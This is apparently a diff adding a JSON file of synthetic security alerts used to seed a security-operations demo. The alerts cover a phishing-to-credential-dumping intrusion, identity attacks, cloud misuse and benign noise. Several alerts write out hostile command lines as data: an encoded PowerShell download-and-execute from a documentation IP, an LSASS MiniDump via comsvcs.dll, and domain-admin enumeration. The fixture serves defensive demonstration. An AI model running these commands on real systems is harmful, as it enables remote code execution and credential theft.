@@ -1,0 +1,264 @@
+{
+  "_synthetic": "Synthetic demo alerts in the LG-SOTF canonical ingest format (POST /api/v1/ingest/alerts). Not real data: domains are example.com/.test, addresses are documentation ranges (192.0.2.0/24 stands for the internal network, 198.51.100.0/24 and 203.0.113.0/24 for the internet). scripts/demo/seed_demo.py shifts occurred_at so the newest alert is a few minutes old.",
+  "alerts": [
+    {
+      "source_alert_id": "demo-edr-001",
+      "title": "Encoded PowerShell launched by Microsoft Word",
+      "severity": "high",
+      "category": "execution",
+      "rule_name": "EDR - Office application spawned encoded PowerShell",
+      "description": "WINWORD.EXE opened 'Q3_Payroll_Adjustments.docm' from the Outlook cache and spawned powershell.exe with -EncodedCommand and a hidden window. The decoded command downloads and executes a script from 203.0.113.50.",
+      "occurred_at": "2026-09-30T08:12:41Z",
+      "entities": {
+        "hosts": ["WS-FIN-0142.corp.example.com"],
+        "users": ["jsmith@example.com"],
+        "ips": ["192.0.2.142", "203.0.113.50"],
+        "processes": ["WINWORD.EXE", "powershell.exe"],
+        "command_lines": ["powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBhACcAKQA="],
+        "hashes": ["275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"]
+      },
+      "mitre": {"tactics": ["TA0002", "TA0005"], "techniques": ["T1059.001", "T1027", "T1204.002"]},
+      "vendor": "Demo EDR"
+    },
+    {
+      "source_alert_id": "demo-edr-002",
+      "title": "LSASS memory read by rundll32 via comsvcs.dll MiniDump",
+      "severity": "critical",
+      "category": "credential_access",
+      "rule_name": "EDR - Credential dumping from LSASS",
+      "description": "rundll32.exe loaded comsvcs.dll and called MiniDump on the lsass.exe process (PID 704), writing C:\\Users\\Public\\lsass.dmp. Parent process is the PowerShell session started from Word eleven minutes earlier.",
+      "occurred_at": "2026-09-30T08:23:05Z",
+      "entities": {
+        "hosts": ["WS-FIN-0142.corp.example.com"],
+        "users": ["jsmith@example.com"],
+        "processes": ["rundll32.exe", "lsass.exe", "powershell.exe"],
+        "command_lines": ["rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 C:\\Users\\Public\\lsass.dmp full"]
+      },
+      "mitre": {"tactics": ["TA0006"], "techniques": ["T1003.001"]},
+      "vendor": "Demo EDR"
+    },
+    {
+      "source_alert_id": "demo-net-001",
+      "title": "Periodic HTTPS beacon to a newly registered domain",
+      "severity": "high",
+      "category": "command_and_control",
+      "rule_name": "NDR - Beaconing with low jitter",
+      "description": "WS-FIN-0142 contacted cdn-sync.updates-cloud.test (198.51.100.23) 118 times in two hours at a 60 s interval with 4% jitter, 412-byte requests and near-constant response sizes. The domain was first seen 3 days ago; the pattern matches a C2 beacon.",
+      "occurred_at": "2026-09-30T08:31:10Z",
+      "entities": {
+        "hosts": ["WS-FIN-0142.corp.example.com"],
+        "ips": ["192.0.2.142", "198.51.100.23"],
+        "domains": ["cdn-sync.updates-cloud.test"],
+        "urls": ["https://cdn-sync.updates-cloud.test/api/v2/poll"]
+      },
+      "mitre": {"tactics": ["TA0011"], "techniques": ["T1071.001", "T1573.002"]},
+      "vendor": "Demo NDR"
+    },
+    {
+      "source_alert_id": "demo-edr-003",
+      "title": "PsExec service installed on a file server from a workstation",
+      "severity": "high",
+      "category": "lateral_movement",
+      "rule_name": "EDR - Remote service creation (PSEXESVC)",
+      "description": "The PSEXESVC service was created on FILESRV-02 over SMB from WS-FIN-0142 using the account jsmith, followed by cmd.exe running 'whoami /all' and 'net group \"Domain Admins\" /domain'.",
+      "occurred_at": "2026-09-30T08:35:52Z",
+      "entities": {
+        "hosts": ["FILESRV-02.corp.example.com", "WS-FIN-0142.corp.example.com"],
+        "users": ["jsmith@example.com"],
+        "ips": ["192.0.2.142", "192.0.2.20"],
+        "processes": ["PSEXESVC.exe", "cmd.exe"],
+        "command_lines": ["whoami /all", "net group \"Domain Admins\" /domain"]
+      },
+      "mitre": {"tactics": ["TA0008", "TA0007"], "techniques": ["T1021.002", "T1569.002", "T1069.002"]},
+      "vendor": "Demo EDR"
+    },
+    {
+      "source_alert_id": "demo-mail-001",
+      "title": "User-reported phishing: \"Action required: payroll adjustment for Q3\"",
+      "severity": "medium",
+      "category": "phishing",
+      "rule_name": "Report Phish button",
+      "description": "jsmith reported an email from payroll@examp1e-hr.test with subject 'Action required: payroll adjustment for Q3' and attachment Q3_Payroll_Adjustments.docm. SPF softfail, DKIM none; the sender domain imitates example.com. Two other recipients in Finance received the same message.",
+      "occurred_at": "2026-09-30T08:44:18Z",
+      "entities": {
+        "users": ["jsmith@example.com", "lchen@example.com", "okafor@example.com"],
+        "emails": ["payroll@examp1e-hr.test", "jsmith@example.com"],
+        "domains": ["examp1e-hr.test"],
+        "urls": ["https://payroll-portal.examp1e-hr.test/login"],
+        "ips": ["203.0.113.77"]
+      },
+      "mitre": {"tactics": ["TA0001"], "techniques": ["T1566.001"]},
+      "email": {
+        "subject": "Action required: payroll adjustment for Q3",
+        "from": "payroll@examp1e-hr.test",
+        "reported_by": "jsmith@example.com",
+        "attachments": ["Q3_Payroll_Adjustments.docm"],
+        "authentication": {"spf": "softfail", "dkim": "none", "dmarc": "fail"}
+      }
+    },
+    {
+      "source_alert_id": "demo-idp-001",
+      "title": "Impossible travel: sign-ins from Lisbon and Singapore 18 minutes apart",
+      "severity": "high",
+      "category": "identity",
+      "rule_name": "IdP - Impossible travel",
+      "description": "mgarcia@example.com signed in to the SSO portal from 203.0.113.10 (Lisbon, PT) and 18 minutes later from 198.51.100.77 (Singapore, SG), 11,400 km apart. The second sign-in used a new browser and passed MFA with a push approval.",
+      "occurred_at": "2026-09-30T07:58:30Z",
+      "entities": {
+        "users": ["mgarcia@example.com"],
+        "ips": ["203.0.113.10", "198.51.100.77"],
+        "emails": ["mgarcia@example.com"]
+      },
+      "mitre": {"tactics": ["TA0001"], "techniques": ["T1078.004"]},
+      "vendor": "Demo IdP"
+    },
+    {
+      "source_alert_id": "demo-idp-002",
+      "title": "MFA fatigue: 23 push requests denied, then one approved",
+      "severity": "high",
+      "category": "identity",
+      "rule_name": "IdP - MFA push bombing",
+      "description": "akumar@example.com received 23 MFA push requests in 9 minutes from sign-in attempts at 198.51.100.61. The first 22 were denied; the 23rd was approved at 02:14 local time and a session was created for Microsoft 365.",
+      "occurred_at": "2026-09-30T08:05:02Z",
+      "entities": {
+        "users": ["akumar@example.com"],
+        "ips": ["198.51.100.61"],
+        "emails": ["akumar@example.com"]
+      },
+      "mitre": {"tactics": ["TA0006", "TA0001"], "techniques": ["T1621", "T1078.004"]},
+      "vendor": "Demo IdP"
+    },
+    {
+      "source_alert_id": "demo-vpn-001",
+      "title": "Brute force against the VPN followed by a successful login",
+      "severity": "high",
+      "category": "identity",
+      "rule_name": "VPN - Many failures then success",
+      "description": "147 failed VPN logins for svc-backup from 203.0.113.99 within 12 minutes, followed by a successful login from the same address. svc-backup is a service account that normally never uses the VPN.",
+      "occurred_at": "2026-09-30T08:09:47Z",
+      "entities": {
+        "users": ["svc-backup@example.com"],
+        "ips": ["203.0.113.99", "192.0.2.1"],
+        "hosts": ["VPN-GW-01.corp.example.com"]
+      },
+      "mitre": {"tactics": ["TA0006", "TA0001"], "techniques": ["T1110.001", "T1078.002"]},
+      "vendor": "Demo VPN"
+    },
+    {
+      "source_alert_id": "demo-aws-001",
+      "title": "EC2 instance credentials used from outside AWS",
+      "severity": "high",
+      "category": "cloud",
+      "rule_name": "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS",
+      "description": "Temporary credentials of the instance role app-prod-ec2-role (instance i-0a1b2c3d4e5f60718) were used from 198.51.100.14, which is not an AWS address, to call ListBuckets and GetObject on s3://acme-finance-exports.",
+      "occurred_at": "2026-09-30T08:16:25Z",
+      "entities": {
+        "users": ["arn:aws:sts::111122223333:assumed-role/app-prod-ec2-role/i-0a1b2c3d4e5f60718"],
+        "hosts": ["i-0a1b2c3d4e5f60718"],
+        "ips": ["198.51.100.14"]
+      },
+      "mitre": {"tactics": ["TA0006", "TA0010"], "techniques": ["T1552.005", "T1530"]},
+      "cloud": {"provider": "aws", "account": "111122223333", "region": "eu-west-1", "service": "guardduty"}
+    },
+    {
+      "source_alert_id": "demo-aws-002",
+      "title": "S3 bucket made public: acme-finance-exports",
+      "severity": "medium",
+      "category": "cloud",
+      "rule_name": "Policy:S3/BucketBlockPublicAccessDisabled",
+      "description": "Block Public Access was disabled on bucket acme-finance-exports by the IAM user deploy-bot and a bucket policy granting s3:GetObject to Principal '*' was attached. The bucket holds monthly finance exports.",
+      "occurred_at": "2026-09-30T08:19:03Z",
+      "entities": {
+        "users": ["arn:aws:iam::111122223333:user/deploy-bot"],
+        "ips": ["198.51.100.14"]
+      },
+      "mitre": {"tactics": ["TA0010"], "techniques": ["T1530"]},
+      "cloud": {"provider": "aws", "account": "111122223333", "region": "eu-west-1", "resource": "arn:aws:s3:::acme-finance-exports"}
+    },
+    {
+      "source_alert_id": "demo-aws-003",
+      "title": "EC2 instance querying a cryptocurrency mining pool domain",
+      "severity": "medium",
+      "category": "cloud",
+      "rule_name": "CryptoCurrency:EC2/BitcoinTool.B!DNS",
+      "description": "Instance i-0f9e8d7c6b5a40312 (build-runner-07) resolved pool.miningpool.test repeatedly; CPU utilisation has been above 95% for 6 hours.",
+      "occurred_at": "2026-09-30T07:40:00Z",
+      "entities": {
+        "hosts": ["i-0f9e8d7c6b5a40312", "build-runner-07"],
+        "domains": ["pool.miningpool.test"],
+        "ips": ["192.0.2.77"]
+      },
+      "mitre": {"tactics": ["TA0040"], "techniques": ["T1496"]},
+      "cloud": {"provider": "aws", "account": "111122223333", "region": "eu-west-1", "service": "guardduty"}
+    },
+    {
+      "source_alert_id": "demo-noise-001",
+      "title": "Antivirus definitions update completed on 412 endpoints",
+      "severity": "info",
+      "category": "maintenance",
+      "rule_name": "AV - Scheduled definitions update",
+      "description": "Scheduled antivirus definitions update 1.419.212.0 completed on 412 of 415 endpoints. Three laptops were offline and will be updated at next check-in.",
+      "occurred_at": "2026-09-30T06:00:12Z",
+      "entities": {"hosts": ["AV-MGMT-01.corp.example.com"], "ips": ["192.0.2.30"]},
+      "vendor": "Demo AV"
+    },
+    {
+      "source_alert_id": "demo-noise-002",
+      "title": "Administrative PowerShell script on management server",
+      "severity": "low",
+      "category": "execution",
+      "rule_name": "EDR - PowerShell script block logging",
+      "description": "it-admin ran the approved, scheduled patch compliance script Get-PatchCompliance.ps1 from MGMT-01 as part of change CHG-20431 (monthly maintenance window). Signed by the internal code-signing certificate.",
+      "occurred_at": "2026-09-30T05:30:00Z",
+      "entities": {
+        "hosts": ["MGMT-01.corp.example.com"],
+        "users": ["it-admin@example.com"],
+        "processes": ["powershell.exe"],
+        "command_lines": ["powershell.exe -File C:\\Scripts\\Get-PatchCompliance.ps1 -Report \\\\FILESRV-02\\it\\reports"]
+      },
+      "vendor": "Demo EDR"
+    },
+    {
+      "source_alert_id": "demo-noise-003",
+      "title": "Port scan from the internal vulnerability scanner",
+      "severity": "low",
+      "category": "reconnaissance",
+      "rule_name": "NDR - Horizontal port scan",
+      "description": "192.0.2.25 (VULNSCAN-01) scanned 1,024 ports on 254 hosts. This is the authorized weekly vulnerability scan, sanctioned under standing change CHG-18800.",
+      "occurred_at": "2026-09-30T03:00:00Z",
+      "entities": {"hosts": ["VULNSCAN-01.corp.example.com"], "ips": ["192.0.2.25"]},
+      "vendor": "Demo NDR"
+    },
+    {
+      "source_alert_id": "demo-noise-004",
+      "title": "Large nightly transfer to the backup server",
+      "severity": "low",
+      "category": "exfiltration",
+      "rule_name": "DLP - Large internal transfer",
+      "description": "FILESRV-02 sent 186 GB to BACKUP-01 between 01:00 and 03:10, matching the scheduled nightly backup job; volume is within the expected range for month end.",
+      "occurred_at": "2026-09-30T03:10:00Z",
+      "entities": {
+        "hosts": ["FILESRV-02.corp.example.com", "BACKUP-01.corp.example.com"],
+        "users": ["svc-backup@example.com"],
+        "ips": ["192.0.2.20", "192.0.2.40"]
+      },
+      "vendor": "Demo DLP"
+    },
+    {
+      "source_alert_id": "demo-idp-003",
+      "title": "Sign-in from a new device and country",
+      "severity": "medium",
+      "category": "identity",
+      "rule_name": "IdP - Unfamiliar sign-in properties",
+      "description": "rpatel@example.com signed in from a new Android device at 203.0.113.140 (Toronto, CA). The user has no previous sign-ins from Canada; HR records show no travel request.",
+      "occurred_at": "2026-09-30T07:22:36Z",
+      "entities": {
+        "users": ["rpatel@example.com"],
+        "ips": ["203.0.113.140"],
+        "emails": ["rpatel@example.com"]
+      },
+      "mitre": {"tactics": ["TA0001"], "techniques": ["T1078"]},
+      "vendor": "Demo IdP"
+    }
+  ]
+}
